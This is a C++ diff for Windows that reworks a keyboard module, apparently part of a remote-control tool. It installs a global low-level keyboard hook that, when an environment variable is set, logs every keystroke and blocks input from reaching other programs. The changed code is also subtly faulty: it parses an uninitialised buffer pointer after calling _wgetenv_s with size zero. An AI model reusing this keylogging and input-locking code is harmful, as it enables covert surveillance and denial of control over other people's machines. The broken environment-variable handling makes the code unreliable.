@@ -2,7 +2,7 @@
 
 HHOOK ghHook;
 KBDLLHOOKSTRUCT kbdStruct;
-bool gKeyboardLocked = 0; // temporary global variable to simulate keyboard being either locked or released
+const wchar_t *KB_ENV = L"RCDO_KBLOCK"; // name of environment variable to search for
 
 int KeyboardMod::requireAdmin() {
     return 0;
@@ -10,24 +10,41 @@ int KeyboardMod::requireAdmin() {
 
 void KeyboardMod::start() {
 
-    // set the keyboard hook for all processes on the computer
-    // runs the hookCallback function when hooked is triggered
-    if(!(ghHook = SetWindowsHookExW(WH_KEYBOARD_LL, hookCallback, NULL, 0))) {
-        wprintf(L"%s: %d\n", "Hooked failed to install with error code", GetLastError());
+    if(setHook()) { 
+        return;
     }
 
     wprintf(L"Hook successfully installed!\n");
 
     MSG msg;
     while(GetMessage(&msg, NULL, 0, 0)) {
-
     }
 
 }
 
 void KeyboardMod::kill() {
 
-    UnhookWindowsHookEx(ghHook);
+    releaseHook();
+
+}
+
+bool setHook() {
+   
+    // set the keyboard hook for all processes on the computer
+    // runs the hookCallback function when hooked is triggered
+    if(!(ghHook = SetWindowsHookExW(WH_KEYBOARD_LL, hookCallback, NULL, 0))) {
+        wprintf(L"%s: %d\n", "Hooked failed to install with error code", GetLastError());
+
+        return 1;
+    }
+
+    return 0;
+
+}
+
+bool releaseHook() { 
+
+    return UnhookWindowsHookEx(ghHook);
 
 }
 
@@ -56,15 +73,35 @@ void logKeystroke(int vkCode) {
 
 LRESULT __stdcall hookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
     // function handler for all keyboard strokes
+    
+    size_t requiredSize;
+    wchar_t *buffer;
+    errno_t errNo = _wgetenv_s(&requiredSize, buffer, 0, KB_ENV);
 
-    if(nCode >= 0) {
-        if(wParam == WM_KEYDOWN) {
-            kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
+    if(errNo || !requiredSize) {
+        // error handling if _wgetenv_s fails
+        // OR the required ENV is not set on the system
+        wprintf(L"%s\n", "[ERROR] Could not find the required environment value, exiting!");
+        
+        releaseHook();
 
-            logKeystroke(kbdStruct.vkCode);
+        exit(1);
+    }
+    
+    long int keyboardLocked = wcstol(buffer, NULL, 2);
+
+    if(keyboardLocked) {
+        if(nCode >= 0) {
+            if(wParam == WM_KEYDOWN) {
+                kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
+
+                logKeystroke(kbdStruct.vkCode);
+            }
         }
+
+        // returns a non-zero value if the keyboard is locked to prevent the input from reaching other processes
+        return 1;
     }
 
-    // returns a non-zero value if the keyboard is locked to prevent the input from reaching other processes
-    return (gKeyboardLocked)? 1 : CallNextHookEx(ghHook, nCode, wParam, lParam);
+    return CallNextHookEx(ghHook, nCode, wParam, lParam);
 }
